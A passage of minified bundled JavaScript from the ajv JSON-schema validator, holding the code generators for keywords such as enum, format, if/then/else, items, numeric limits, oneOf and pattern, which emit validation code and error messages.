validate.schema"+Y.schemaPath+" , data: "+M+" ";G+=" } "}else G+=" {} ";var Q1=G;if(G=d.pop(),!Y.compositeRule&&Z)if(Y.async)G+=" throw new ValidationError(["+Q1+"]); ";else G+=" validate.errors = ["+Q1+"]; return false; ";else G+=" var err = "+Q1+";  if (vErrors === null) vErrors = [err]; else vErrors.push(err); errors++; "}else{G+=" ) { ";var u=T;if(u){var a,z1=-1,B1=u.length-1;while(z1<B1){a=u[z1+=1];var m=Y.util.getProperty(a),H1=Y.util.escapeQuotes(a),o=M+m;if(Y.opts._errorDataPathProperty)Y.errorPath=Y.util.getPath(k,a,Y.opts.jsonPointers);if(G+=" if ( "+o+" === undefined ",S)G+=" || ! Object.prototype.hasOwnProperty.call("+M+", '"+Y.util.escapeQuotes(a)+"') ";if(G+=") {  var err =   ",Y.createErrors!==!1){if(G+=" { keyword: 'dependencies' , dataPath: (dataPath || '') + "+Y.errorPath+" , schemaPath: "+Y.util.toQuotedString(B)+" , params: { property: '"+Y.util.escapeQuotes(E)+"', missingProperty: '"+H1+"', depsCount: "+T.length+", deps: '"+Y.util.escapeQuotes(T.length==1?T[0]:T.join(", "))+"' } ",Y.opts.messages!==!1){if(G+=" , message: 'should have ",T.length==1)G+="property "+Y.util.escapeQuotes(T[0]);else G+="properties "+Y.util.escapeQuotes(T.join(", "));G+=" when property "+Y.util.escapeQuotes(E)+" is present' "}if(Y.opts.verbose)G+=" , schema: validate.schema"+V+" , parentSchema: validate.schema"+Y.schemaPath+" , data: "+M+" ";G+=" } "}else G+=" {} ";G+=";  if (vErrors === null) vErrors = [err]; else vErrors.push(err); errors++; } "}}}if(G+=" }   ",Z)O+="}",G+=" else { "}Y.errorPath=k;var N1=j.baseId;for(var E in A){var $=A[E];if(Y.opts.strictKeywords?typeof $=="object"&&Object.keys($).length>0||$===!1:Y.util.schemaHasRules($,Y.RULES.all)){if(G+=" "+N+" = true; if ( "+M+Y.util.getProperty(E)+" !== undefined ",S)G+=" && Object.prototype.hasOwnProperty.call("+M+", '"+Y.util.escapeQuotes(E)+"') ";if(G+=") { ",j.schema=$,j.schemaPath=V+Y.util.getProperty(E),j.errSchemaPath=B+"/"+Y.util.escapeFragment(E),G+="  "+Y.validate(j)+" ",j.baseId=N1,G+=" }  ",Z)G+=" if ("+N+") { ",O+="}"}}if(Z)G+="   "+O+" if ("+F+" == errors) {";return G}}),Wf1=Y0((X,J)=>{J.exports=function Q(Y,W,z){var G=" ",H=Y.level,U=Y.dataLevel,K=Y.schema[W],V=Y.schemaPath+Y.util.getProperty(W),B=Y.errSchemaPath+"/"+W,Z=!Y.opts.allErrors,M="data"+(U||""),F="valid"+H,j=Y.opts.$data&&K&&K.$data,O;if(j)G+=" var schema"+H+" = "+Y.util.getData(K.$data,U,Y.dataPathArr)+"; ",O="schema"+H;else O=K;var N="i"+H,A="schema"+H;if(!j)G+=" var "+A+" = validate.schema"+V+";";if(G+="var "+F+";",j)G+=" if (schema"+H+" === undefined) "+F+" = true; else if (!Array.isArray(schema"+H+")) "+F+" = false; else {";if(G+=""+F+" = false;for (var "+N+"=0; "+N+"<"+A+".length; "+N+"++) if (equal("+M+", "+A+"["+N+"])) { "+F+" = true; break; }",j)G+="  }  ";G+=" if (!"+F+") {   ";var D=D||[];if(D.push(G),G="",Y.createErrors!==!1){if(G+=" { keyword: 'enum' , dataPath: (dataPath || '') + "+Y.errorPath+" , schemaPath: "+Y.util.toQuotedString(B)+" , params: { allowedValues: schema"+H+" } ",Y.opts.messages!==!1)G+=" , message: 'should be equal to one of the allowed values' ";if(Y.opts.verbose)G+=" , schema: validate.schema"+V+" , parentSchema: validate.schema"+Y.schemaPath+" , data: "+M+" ";G+=" } "}else G+=" {} ";var S=G;if(G=D.pop(),!Y.compositeRule&&Z)if(Y.async)G+=" throw new ValidationError(["+S+"]); ";else G+=" validate.errors = ["+S+"]; return false; ";else G+=" var err = "+S+";  if (vErrors === null) vErrors = [err]; else vErrors.push(err); errors++; ";if(G+=" }",Z)G+=" else { ";return G}}),Gf1=Y0((X,J)=>{J.exports=function Q(Y,W,z){var G=" ",H=Y.level,U=Y.dataLevel,K=Y.schema[W],V=Y.schemaPath+Y.util.getProperty(W),B=Y.errSchemaPath+"/"+W,Z=!Y.opts.allErrors,M="data"+(U||"");if(Y.opts.format===!1){if(Z)G+=" if (true) { ";return G}var F=Y.opts.$data&&K&&K.$data,j;if(F)G+=" var schema"+H+" = "+Y.util.getData(K.$data,U,Y.dataPathArr)+"; ",j="schema"+H;else j=K;var O=Y.opts.unknownFormats,N=Array.isArray(O);if(F){var A="format"+H,D="isObject"+H,S="formatType"+H;if(G+=" var "+A+" = formats["+j+"]; var "+D+" = typeof "+A+" == 'object' && !("+A+" instanceof RegExp) && "+A+".validate; var "+S+" = "+D+" && "+A+".type || 'string'; if ("+D+") { ",Y.async)G+=" var async"+H+" = "+A+".async; ";if(G+=" "+A+" = "+A+".validate; } if (  ",F)G+=" ("+j+" !== undefined && typeof "+j+" != 'string') || ";if(G+=" (",O!="ignore"){if(G+=" ("+j+" && !"+A+" ",N)G+=" && self._opts.unknownFormats.indexOf("+j+") == -1 ";G+=") || "}if(G+=" ("+A+" && "+S+" == '"+z+"' && !(typeof "+A+" == 'function' ? ",Y.async)G+=" (async"+H+" ? await "+A+"("+M+") : "+A+"("+M+")) ";else G+=" "+A+"("+M+") ";G+=" : "+A+".test("+M+"))))) {"}else{var A=Y.formats[K];if(!A)if(O=="ignore"){if(Y.logger.warn('unknown format "'+K+'" ignored in schema at path "'+Y.errSchemaPath+'"'),Z)G+=" if (true) { ";return G}else if(N&&O.indexOf(K)>=0){if(Z)G+=" if (true) { ";return G}else throw new Error('unknown format "'+K+'" is used in schema at path "'+Y.errSchemaPath+'"');var D=typeof A=="object"&&!(A instanceof RegExp)&&A.validate,S=D&&A.type||"string";if(D){var $=A.async===!0;A=A.validate}if(S!=z){if(Z)G+=" if (true) { ";return G}if($){if(!Y.async)throw new Error("async format in sync schema");var T="formats"+Y.util.getProperty(K)+".validate";G+=" if (!(await "+T+"("+M+"))) { "}else{G+=" if (! ";var T="formats"+Y.util.getProperty(K);if(D)T+=".validate";if(typeof A=="function")G+=" "+T+"("+M+") ";else G+=" "+T+".test("+M+") ";G+=") { "}}var k=k||[];if(k.push(G),G="",Y.createErrors!==!1){if(G+=" { keyword: 'format' , dataPath: (dataPath || '') + "+Y.errorPath+" , schemaPath: "+Y.util.toQuotedString(B)+" , params: { format:  ",F)G+=""+j;else G+=""+Y.util.toQuotedString(K);if(G+="  } ",Y.opts.messages!==!1){if(G+=` , message: 'should match format "`,F)G+="' + "+j+" + '";else G+=""+Y.util.escapeQuotes(K);G+=`"' `}if(Y.opts.verbose){if(G+=" , schema:  ",F)G+="validate.schema"+V;else G+=""+Y.util.toQuotedString(K);G+="         , parentSchema: validate.schema"+Y.schemaPath+" , data: "+M+" "}G+=" } "}else G+=" {} ";var E=G;if(G=k.pop(),!Y.compositeRule&&Z)if(Y.async)G+=" throw new ValidationError(["+E+"]); ";else G+=" validate.errors = ["+E+"]; return false; ";else G+=" var err = "+E+";  if (vErrors === null) vErrors = [err]; else vErrors.push(err); errors++; ";if(G+=" } ",Z)G+=" else { ";return G}}),zf1=Y0((X,J)=>{J.exports=function Q(Y,W,z){var G=" ",H=Y.level,U=Y.dataLevel,K=Y.schema[W],V=Y.schemaPath+Y.util.getProperty(W),B=Y.errSchemaPath+"/"+W,Z=!Y.opts.allErrors,M="data"+(U||""),F="valid"+H,j="errs__"+H,O=Y.util.copy(Y);O.level++;var N="valid"+O.level,A=Y.schema.then,D=Y.schema.else,S=A!==void 0&&(Y.opts.strictKeywords?typeof A=="object"&&Object.keys(A).length>0||A===!1:Y.util.schemaHasRules(A,Y.RULES.all)),$=D!==void 0&&(Y.opts.strictKeywords?typeof D=="object"&&Object.keys(D).length>0||D===!1:Y.util.schemaHasRules(D,Y.RULES.all)),T=O.baseId;if(S||$){var k;O.createErrors=!1,O.schema=K,O.schemaPath=V,O.errSchemaPath=B,G+=" var "+j+" = errors; var "+F+" = true;  ";var E=Y.compositeRule;if(Y.compositeRule=O.compositeRule=!0,G+="  "+Y.validate(O)+" ",O.baseId=T,O.createErrors=!0,G+="  errors = "+j+"; if (vErrors !== null) { if ("+j+") vErrors.length = "+j+"; else vErrors = null; }  ",Y.compositeRule=O.compositeRule=E,S){if(G+=" if ("+N+") {  ",O.schema=Y.schema.then,O.schemaPath=Y.schemaPath+".then",O.errSchemaPath=Y.errSchemaPath+"/then",G+="  "+Y.validate(O)+" ",O.baseId=T,G+=" "+F+" = "+N+"; ",S&&$)k="ifClause"+H,G+=" var "+k+" = 'then'; ";else k="'then'";if(G+=" } ",$)G+=" else { "}else G+=" if (!"+N+") { ";if($){if(O.schema=Y.schema.else,O.schemaPath=Y.schemaPath+".else",O.errSchemaPath=Y.errSchemaPath+"/else",G+="  "+Y.validate(O)+" ",O.baseId=T,G+=" "+F+" = "+N+"; ",S&&$)k="ifClause"+H,G+=" var "+k+" = 'else'; ";else k="'else'";G+=" } "}if(G+=" if (!"+F+") {   var err =   ",Y.createErrors!==!1){if(G+=" { keyword: 'if' , dataPath: (dataPath || '') + "+Y.errorPath+" , schemaPath: "+Y.util.toQuotedString(B)+" , params: { failingKeyword: "+k+" } ",Y.opts.messages!==!1)G+=` , message: 'should match "' + `+k+` + '" schema' `;if(Y.opts.verbose)G+=" , schema: validate.schema"+V+" , parentSchema: validate.schema"+Y.schemaPath+" , data: "+M+" ";G+=" } "}else G+=" {} ";if(G+=";  if (vErrors === null) vErrors = [err]; else vErrors.push(err); errors++; ",!Y.compositeRule&&Z)if(Y.async)G+=" throw new ValidationError(vErrors); ";else G+=" validate.errors = vErrors; return false; ";if(G+=" }   ",Z)G+=" else { "}else if(Z)G+=" if (true) { ";return G}}),Hf1=Y0((X,J)=>{J.exports=function Q(Y,W,z){var G=" ",H=Y.level,U=Y.dataLevel,K=Y.schema[W],V=Y.schemaPath+Y.util.getProperty(W),B=Y.errSchemaPath+"/"+W,Z=!Y.opts.allErrors,M="data"+(U||""),F="valid"+H,j="errs__"+H,O=Y.util.copy(Y),N="";O.level++;var A="valid"+O.level,D="i"+H,S=O.dataLevel=Y.dataLevel+1,$="data"+S,T=Y.baseId;if(G+="var "+j+" = errors;var "+F+";",Array.isArray(K)){var k=Y.schema.additionalItems;if(k===!1){G+=" "+F+" = "+M+".length <= "+K.length+"; ";var E=B;B=Y.errSchemaPath+"/additionalItems",G+="  if (!"+F+") {   ";var y=y||[];if(y.push(G),G="",Y.createErrors!==!1){if(G+=" { keyword: 'additionalItems' , dataPath: (dataPath || '') + "+Y.errorPath+" , schemaPath: "+Y.util.toQuotedString(B)+" , params: { limit: "+K.length+" } ",Y.opts.messages!==!1)G+=" , message: 'should NOT have more than "+K.length+" items' ";if(Y.opts.verbose)G+=" , schema: false , parentSchema: validate.schema"+Y.schemaPath+" , data: "+M+" ";G+=" } "}else G+=" {} ";var a=G;if(G=y.pop(),!Y.compositeRule&&Z)if(Y.async)G+=" throw new ValidationError(["+a+"]); ";else G+=" validate.errors = ["+a+"]; return false; ";else G+=" var err = "+a+";  if (vErrors === null) vErrors = [err]; else vErrors.push(err); errors++; ";if(G+=" } ",B=E,Z)N+="}",G+=" else { "}var p=K;if(p){var f,m=-1,o=p.length-1;while(m<o)if(f=p[m+=1],Y.opts.strictKeywords?typeof f=="object"&&Object.keys(f).length>0||f===!1:Y.util.schemaHasRules(f,Y.RULES.all)){G+=" "+A+" = true; if ("+M+".length > "+m+") { ";var J1=M+"["+m+"]";O.schema=f,O.schemaPath=V+"["+m+"]",O.errSchemaPath=B+"/"+m,O.errorPath=Y.util.getPathExpr(Y.errorPath,m,Y.opts.jsonPointers,!0),O.dataPathArr[S]=m;var H1=Y.validate(O);if(O.baseId=T,Y.util.varOccurences(H1,$)<2)G+=" "+Y.util.varReplace(H1,$,J1)+" ";else G+=" var "+$+" = "+J1+"; "+H1+" ";if(G+=" }  ",Z)G+=" if ("+A+") { ",N+="}"}}if(typeof k=="object"&&(Y.opts.strictKeywords?typeof k=="object"&&Object.keys(k).length>0||k===!1:Y.util.schemaHasRules(k,Y.RULES.all))){O.schema=k,O.schemaPath=Y.schemaPath+".additionalItems",O.errSchemaPath=Y.errSchemaPath+"/additionalItems",G+=" "+A+" = true; if ("+M+".length > "+K.length+") {  for (var "+D+" = "+K.length+"; "+D+" < "+M+".length; "+D+"++) { ",O.errorPath=Y.util.getPathExpr(Y.errorPath,D,Y.opts.jsonPointers,!0);var J1=M+"["+D+"]";O.dataPathArr[S]=D;var H1=Y.validate(O);if(O.baseId=T,Y.util.varOccurences(H1,$)<2)G+=" "+Y.util.varReplace(H1,$,J1)+" ";else G+=" var "+$+" = "+J1+"; "+H1+" ";if(Z)G+=" if (!"+A+") break; ";if(G+=" } }  ",Z)G+=" if ("+A+") { ",N+="}"}}else if(Y.opts.strictKeywords?typeof K=="object"&&Object.keys(K).length>0||K===!1:Y.util.schemaHasRules(K,Y.RULES.all)){O.schema=K,O.schemaPath=V,O.errSchemaPath=B,G+="  for (var "+D+" = 0; "+D+" < "+M+".length; "+D+"++) { ",O.errorPath=Y.util.getPathExpr(Y.errorPath,D,Y.opts.jsonPointers,!0);var J1=M+"["+D+"]";O.dataPathArr[S]=D;var H1=Y.validate(O);if(O.baseId=T,Y.util.varOccurences(H1,$)<2)G+=" "+Y.util.varReplace(H1,$,J1)+" ";else G+=" var "+$+" = "+J1+"; "+H1+" ";if(Z)G+=" if (!"+A+") break; ";G+=" }"}if(Z)G+=" "+N+" if ("+j+" == errors) {";return G}}),ZN=Y0((X,J)=>{J.exports=function Q(Y,W,z){var G=" ",H=Y.level,U=Y.dataLevel,K=Y.schema[W],V=Y.schemaPath+Y.util.getProperty(W),B=Y.errSchemaPath+"/"+W,Z=!Y.opts.allErrors,T,M="data"+(U||""),F=Y.opts.$data&&K&&K.$data,j;if(F)G+=" var schema"+H+" = "+Y.util.getData(K.$data,U,Y.dataPathArr)+"; ",j="schema"+H;else j=K;var O=W=="maximum",N=O?"exclusiveMaximum":"exclusiveMinimum",A=Y.schema[N],D=Y.opts.$data&&A&&A.$data,S=O?"<":">",$=O?">":"<",T=void 0;if(!(F||typeof K=="number"||K===void 0))throw new Error(W+" must be number");if(!(D||A===void 0||typeof A=="number"||typeof A=="boolean"))throw new Error(N+" must be number or boolean");if(D){var k=Y.util.getData(A.$data,U,Y.dataPathArr),E="exclusive"+H,y="exclType"+H,a="exclIsNumber"+H,p="op"+H,f="' + "+p+" + '";G+=" var schemaExcl"+H+" = "+k+"; ",k="schemaExcl"+H,G+=" var "+E+"; var "+y+" = typeof "+k+"; if ("+y+" != 'boolean' && "+y+" != 'undefined' && "+y+" != 'number') { ";var T=N,m=m||[];if(m.push(G),G="",Y.createErrors!==!1){if(G+=" { keyword: '"+(T||"_exclusiveLimit")+"' , dataPath: (dataPath || '') + "+Y.errorPath+" , schemaPath: "+Y.util.toQuotedString(B)+" , params: {} ",Y.opts.messages!==!1)G+=" , message: '"+N+" should be boolean' ";if(Y.opts.verbose)G+=" , schema: validate.schema"+V+" , parentSchema: validate.schema"+Y.schemaPath+" , data: "+M+" ";G+=" } "}else G+=" {} ";var o=G;if(G=m.pop(),!Y.compositeRule&&Z)if(Y.async)G+=" throw new ValidationError(["+o+"]); ";else G+=" validate.errors = ["+o+"]; return false; ";else G+=" var err = "+o+";  if (vErrors === null) vErrors = [err]; else vErrors.push(err); errors++; ";if(G+=" } else if ( ",F)G+=" ("+j+" !== undefined && typeof "+j+" != 'number') || ";if(G+=" "+y+" == 'number' ? ( ("+E+" = "+j+" === undefined || "+k+" "+S+"= "+j+") ? "+M+" "+$+"= "+k+" : "+M+" "+$+" "+j+" ) : ( ("+E+" = "+k+" === true) ? "+M+" "+$+"= "+j+" : "+M+" "+$+" "+j+" ) || "+M+" !== "+M+") { var op"+H+" = "+E+" ? '"+S+"' : '"+S+"='; ",K===void 0)T=N,B=Y.errSchemaPath+"/"+N,j=k,F=D}else{var a=typeof A=="number",f=S;if(a&&F){var p="'"+f+"'";if(G+=" if ( ",F)G+=" ("+j+" !== undefined && typeof "+j+" != 'number') || ";G+=" ( "+j+" === undefined || "+A+" "+S+"= "+j+" ? "+M+" "+$+"= "+A+" : "+M+" "+$+" "+j+" ) || "+M+" !== "+M+") { "}else{if(a&&K===void 0)E=!0,T=N,B=Y.errSchemaPath+"/"+N,j=A,$+="=";else{if(a)j=Math[O?"min":"max"](A,K);if(A===(a?j:!0))E=!0,T=N,B=Y.errSchemaPath+"/"+N,$+="=";else E=!1,f+="="}var p="'"+f+"'";if(G+=" if ( ",F)G+=" ("+j+" !== undefined && typeof "+j+" != 'number') || ";G+=" "+M+" "+$+" "+j+" || "+M+" !== "+M+") { "}}T=T||W;var m=m||[];if(m.push(G),G="",Y.createErrors!==!1){if(G+=" { keyword: '"+(T||"_limit")+"' , dataPath: (dataPath || '') + "+Y.errorPath+" , schemaPath: "+Y.util.toQuotedString(B)+" , params: { comparison: "+p+", limit: "+j+", exclusive: "+E+" } ",Y.opts.messages!==!1)if(G+=" , message: 'should be "+f+" ",F)G+="' + "+j;else G+=""+j+"'";if(Y.opts.verbose){if(G+=" , schema:  ",F)G+="validate.schema"+V;else G+=""+K;G+="         , parentSchema: validate.schema"+Y.schemaPath+" , data: "+M+" "}G+=" } "}else G+=" {} ";var o=G;if(G=m.pop(),!Y.compositeRule&&Z)if(Y.async)G+=" throw new ValidationError(["+o+"]); ";else G+=" validate.errors = ["+o+"]; return false; ";else G+=" var err = "+o+";  if (vErrors === null) vErrors = [err]; else vErrors.push(err); errors++; ";if(G+=" } ",Z)G+=" else { ";return G}}),MN=Y0((X,J)=>{J.exports=function Q(Y,W,z){var G=" ",H=Y.level,U=Y.dataLevel,K=Y.schema[W],V=Y.schemaPath+Y.util.getProperty(W),B=Y.errSchemaPath+"/"+W,Z=!Y.opts.allErrors,N,M="data"+(U||""),F=Y.opts.$data&&K&&K.$data,j;if(F)G+=" var schema"+H+" = "+Y.util.getData(K.$data,U,Y.dataPathArr)+"; ",j="schema"+H;else j=K;if(!(F||typeof K=="number"))throw new Error(W+" must be number");var O=W=="maxItems"?">":"<";if(G+="if ( ",F)G+=" ("+j+" !== undefined && typeof "+j+" != 'number') || ";G+=" "+M+".length "+O+" "+j+") { ";var N=W,A=A||[];if(A.push(G),G="",Y.createErrors!==!1){if(G+=" { keyword: '"+(N||"_limitItems")+"' , dataPath: (dataPath || '') + "+Y.errorPath+" , schemaPath: "+Y.util.toQuotedString(B)+" , params: { limit: "+j+" } ",Y.opts.messages!==!1){if(G+=" , message: 'should NOT have ",W=="maxItems")G+="more";else G+="fewer";if(G+=" than ",F)G+="' + "+j+" + '";else G+=""+K;G+=" items' "}if(Y.opts.verbose){if(G+=" , schema:  ",F)G+="validate.schema"+V;else G+=""+K;G+="         , parentSchema: validate.schema"+Y.schemaPath+" , data: "+M+" "}G+=" } "}else G+=" {} ";var D=G;if(G=A.pop(),!Y.compositeRule&&Z)if(Y.async)G+=" throw new ValidationError(["+D+"]); ";else G+=" validate.errors = ["+D+"]; return false; ";else G+=" var err = "+D+";  if (vErrors === null) vErrors = [err]; else vErrors.push(err); errors++; ";if(G+="} ",Z)G+=" else { ";return G}}),FN=Y0((X,J)=>{J.exports=function Q(Y,W,z){var G=" ",H=Y.level,U=Y.dataLevel,K=Y.schema[W],V=Y.schemaPath+Y.util.getProperty(W),B=Y.errSchemaPath+"/"+W,Z=!Y.opts.allErrors,N,M="data"+(U||""),F=Y.opts.$data&&K&&K.$data,j;if(F)G+=" var schema"+H+" = "+Y.util.getData(K.$data,U,Y.dataPathArr)+"; ",j="schema"+H;else j=K;if(!(F||typeof K=="number"))throw new Error(W+" must be number");var O=W=="maxLength"?">":"<";if(G+="if ( ",F)G+=" ("+j+" !== undefined && typeof "+j+" != 'number') || ";if(Y.opts.unicode===!1)G+=" "+M+".length ";else G+=" ucs2length("+M+") ";G+=" "+O+" "+j+") { ";var N=W,A=A||[];if(A.push(G),G="",Y.createErrors!==!1){if(G+=" { keyword: '"+(N||"_limitLength")+"' , dataPath: (dataPath || '') + "+Y.errorPath+" , schemaPath: "+Y.util.toQuotedString(B)+" , params: { limit: "+j+" } ",Y.opts.messages!==!1){if(G+=" , message: 'should NOT be ",W=="maxLength")G+="longer";else G+="shorter";if(G+=" than ",F)G+="' + "+j+" + '";else G+=""+K;G+=" characters' "}if(Y.opts.verbose){if(G+=" , schema:  ",F)G+="validate.schema"+V;else G+=""+K;G+="         , parentSchema: validate.schema"+Y.schemaPath+" , data: "+M+" "}G+=" } "}else G+=" {} ";var D=G;if(G=A.pop(),!Y.compositeRule&&Z)if(Y.async)G+=" throw new ValidationError(["+D+"]); ";else G+=" validate.errors = ["+D+"]; return false; ";else G+=" var err = "+D+";  if (vErrors === null) vErrors = [err]; else vErrors.push(err); errors++; ";if(G+="} ",Z)G+=" else { ";return G}}),jN=Y0((X,J)=>{J.exports=function Q(Y,W,z){var G=" ",H=Y.level,U=Y.dataLevel,K=Y.schema[W],V=Y.schemaPath+Y.util.getProperty(W),B=Y.errSchemaPath+"/"+W,Z=!Y.opts.allErrors,N,M="data"+(U||""),F=Y.opts.$data&&K&&K.$data,j;if(F)G+=" var schema"+H+" = "+Y.util.getData(K.$data,U,Y.dataPathArr)+"; ",j="schema"+H;else j=K;if(!(F||typeof K=="number"))throw new Error(W+" must be number");var O=W=="maxProperties"?">":"<";if(G+="if ( ",F)G+=" ("+j+" !== undefined && typeof "+j+" != 'number') || ";G+=" Object.keys("+M+").length "+O+" "+j+") { ";var N=W,A=A||[];if(A.push(G),G="",Y.createErrors!==!1){if(G+=" { keyword: '"+(N||"_limitProperties")+"' , dataPath: (dataPath || '') + "+Y.errorPath+" , schemaPath: "+Y.util.toQuotedString(B)+" , params: { limit: "+j+" } ",Y.opts.messages!==!1){if(G+=" , message: 'should NOT have ",W=="maxProperties")G+="more";else G+="fewer";if(G+=" than ",F)G+="' + "+j+" + '";else G+=""+K;G+=" properties' "}if(Y.opts.verbose){if(G+=" , schema:  ",F)G+="validate.schema"+V;else G+=""+K;G+="         , parentSchema: validate.schema"+Y.schemaPath+" , data: "+M+" "}G+=" } "}else G+=" {} ";var D=G;if(G=A.pop(),!Y.compositeRule&&Z)if(Y.async)G+=" throw new ValidationError(["+D+"]); ";else G+=" validate.errors = ["+D+"]; return false; ";else G+=" var err = "+D+";  if (vErrors === null) vErrors = [err]; else vErrors.push(err); errors++; ";if(G+="} ",Z)G+=" else { ";return G}}),Uf1=Y0((X,J)=>{J.exports=function Q(Y,W,z){var G=" ",H=Y.level,U=Y.dataLevel,K=Y.schema[W],V=Y.schemaPath+Y.util.getProperty(W),B=Y.errSchemaPath+"/"+W,Z=!Y.opts.allErrors,M="data"+(U||""),F=Y.opts.$data&&K&&K.$data,j;if(F)G+=" var schema"+H+" = "+Y.util.getData(K.$data,U,Y.dataPathArr)+"; ",j="schema"+H;else j=K;if(!(F||typeof K=="number"))throw new Error(W+" must be number");if(G+="var division"+H+";if (",F)G+=" "+j+" !== undefined && ( typeof "+j+" != 'number' || ";if(G+=" (division"+H+" = "+M+" / "+j+", ",Y.opts.multipleOfPrecision)G+=" Math.abs(Math.round(division"+H+") - division"+H+") > 1e-"+Y.opts.multipleOfPrecision+" ";else G+=" division"+H+" !== parseInt(division"+H+") ";if(G+=" ) ",F)G+="  )  ";G+=" ) {   ";var O=O||[];if(O.push(G),G="",Y.createErrors!==!1){if(G+=" { keyword: 'multipleOf' , dataPath: (dataPath || '') + "+Y.errorPath+" , schemaPath: "+Y.util.toQuotedString(B)+" , params: { multipleOf: "+j+" } ",Y.opts.messages!==!1)if(G+=" , message: 'should be multiple of ",F)G+="' + "+j;else G+=""+j+"'";if(Y.opts.verbose){if(G+=" , schema:  ",F)G+="validate.schema"+V;else G+=""+K;G+="         , parentSchema: validate.schema"+Y.schemaPath+" , data: "+M+" "}G+=" } "}else G+=" {} ";var N=G;if(G=O.pop(),!Y.compositeRule&&Z)if(Y.async)G+=" throw new ValidationError(["+N+"]); ";else G+=" validate.errors = ["+N+"]; return false; ";else G+=" var err = "+N+";  if (vErrors === null) vErrors = [err]; else vErrors.push(err); errors++; ";if(G+="} ",Z)G+=" else { ";return G}}),Kf1=Y0((X,J)=>{J.exports=function Q(Y,W,z){var G=" ",H=Y.level,U=Y.dataLevel,K=Y.schema[W],V=Y.schemaPath+Y.util.getProperty(W),B=Y.errSchemaPath+"/"+W,Z=!Y.opts.allErrors,M="data"+(U||""),F="errs__"+H,j=Y.util.copy(Y);j.level++;var O="valid"+j.level;if(Y.opts.strictKeywords?typeof K=="object"&&Object.keys(K).length>0||K===!1:Y.util.schemaHasRules(K,Y.RULES.all)){j.schema=K,j.schemaPath=V,j.errSchemaPath=B,G+=" var "+F+" = errors;  ";var N=Y.compositeRule;Y.compositeRule=j.compositeRule=!0,j.createErrors=!1;var A;if(j.opts.allErrors)A=j.opts.allErrors,j.opts.allErrors=!1;if(G+=" "+Y.validate(j)+" ",j.createErrors=!0,A)j.opts.allErrors=A;Y.compositeRule=j.compositeRule=N,G+=" if ("+O+") {   ";var D=D||[];if(D.push(G),G="",Y.createErrors!==!1){if(G+=" { keyword: 'not' , dataPath: (dataPath || '') + "+Y.errorPath+" , schemaPath: "+Y.util.toQuotedString(B)+" , params: {} ",Y.opts.messages!==!1)G+=" , message: 'should NOT be valid' ";if(Y.opts.verbose)G+=" , schema: validate.schema"+V+" , parentSchema: validate.schema"+Y.schemaPath+" , data: "+M+" ";G+=" } "}else G+=" {} ";var S=G;if(G=D.pop(),!Y.compositeRule&&Z)if(Y.async)G+=" throw new ValidationError(["+S+"]); ";else G+=" validate.errors = ["+S+"]; return false; ";else G+=" var err = "+S+";  if (vErrors === null) vErrors = [err]; else vErrors.push(err); errors++; ";if(G+=" } else {  errors = "+F+"; if (vErrors !== null) { if ("+F+") vErrors.length = "+F+"; else vErrors = null; } ",Y.opts.allErrors)G+=" } "}else{if(G+="  var err =   ",Y.createErrors!==!1){if(G+=" { keyword: 'not' , dataPath: (dataPath || '') + "+Y.errorPath+" , schemaPath: "+Y.util.toQuotedString(B)+" , params: {} ",Y.opts.messages!==!1)G+=" , message: 'should NOT be valid' ";if(Y.opts.verbose)G+=" , schema: validate.schema"+V+" , parentSchema: validate.schema"+Y.schemaPath+" , data: "+M+" ";G+=" } "}else G+=" {} ";if(G+=";  if (vErrors === null) vErrors = [err]; else vErrors.push(err); errors++; ",Z)G+=" if (false) { "}return G}}),Vf1=Y0((X,J)=>{J.exports=function Q(Y,W,z){var G=" ",H=Y.level,U=Y.dataLevel,K=Y.schema[W],V=Y.schemaPath+Y.util.getProperty(W),B=Y.errSchemaPath+"/"+W,Z=!Y.opts.allErrors,M="data"+(U||""),F="valid"+H,j="errs__"+H,O=Y.util.copy(Y),N="";O.level++;var A="valid"+O.level,D=O.baseId,S="prevValid"+H,$="passingSchemas"+H;G+="var "+j+" = errors , "+S+" = false , "+F+" = false , "+$+" = null; ";var T=Y.compositeRule;Y.compositeRule=O.compositeRule=!0;var k=K;if(k){var E,y=-1,a=k.length-1;while(y<a){if(E=k[y+=1],Y.opts.strictKeywords?typeof E=="object"&&Object.keys(E).length>0||E===!1:Y.util.schemaHasRules(E,Y.RULES.all))O.schema=E,O.schemaPath=V+"["+y+"]",O.errSchemaPath=B+"/"+y,G+="  "+Y.validate(O)+" ",O.baseId=D;else G+=" var "+A+" = true; ";if(y)G+=" if ("+A+" && "+S+") { "+F+" = false; "+$+" = ["+$+", "+y+"]; } else { ",N+="}";G+=" if ("+A+") { "+F+" = "+S+" = true; "+$+" = "+y+"; }"}}if(Y.compositeRule=O.compositeRule=T,G+=""+N+"if (!"+F+") {   var err =   ",Y.createErrors!==!1){if(G+=" { keyword: 'oneOf' , dataPath: (dataPath || '') + "+Y.errorPath+" , schemaPath: "+Y.util.toQuotedString(B)+" , params: { passingSchemas: "+$+" } ",Y.opts.messages!==!1)G+=" , message: 'should match exactly one schema in oneOf' ";if(Y.opts.verbose)G+=" , schema: validate.schema"+V+" , parentSchema: validate.schema"+Y.schemaPath+" , data: "+M+" ";G+=" } "}else G+=" {} ";if(G+=";  if (vErrors === null) vErrors = [err]; else vErrors.push(err); errors++; ",!Y.compositeRule&&Z)if(Y.async)G+=" throw new ValidationError(vErrors); ";else G+=" validate.errors = vErrors; return false; ";if(G+="} else {  errors = "+j+"; if (vErrors !== null) { if ("+j+") vErrors.length = "+j+"; else vErrors = null; }",Y.opts.allErrors)G+=" } ";return G}}),Bf1=Y0((X,J)=>{J.exports=function Q(Y,W,z){var G=" ",H=Y.level,U=Y.dataLevel,K=Y.schema[W],V=Y.schemaPath+Y.util.getProperty(W),B=Y.errSchemaPath+"/"+W,Z=!Y.opts.allErrors,M="data"+(U||""),F=Y.opts.$data&&K&&K.$data,j;if(F)G+=" var schema"+H+" = "+Y.util.getData(K.$data,U,Y.dataPathArr)+"; ",j="schema"+H;else j=K;var O=F?"(new RegExp("+j+"))":Y.usePattern(K);if(G+="if ( ",F)G+=" ("+j+" !== undefined && typeof "+j+" != 'string') || ";G+=" !"+O+".test("+M+") ) {   ";var N=N||[];if(N.push(G),G="",Y.createErrors!==!1){if(G+=" { keyword: 'pattern' , dataPath: (dataPath || '') + "+Y.errorPath+" , schemaPath: "+Y.util.toQuotedString(B)+" , params: { pattern:  ",F)G+=""+j;else G+=""+Y.util.toQuotedString(K);if(G+="  } ",Y.opts.messages!==!1){if(G+=` , message: 'should match pattern "`,F)G+="' + "+j+" + '";else G+=""+Y.util.escapeQuotes(K);G+=`"' `}if(Y.opts.verbose){if(G+=" , schema: 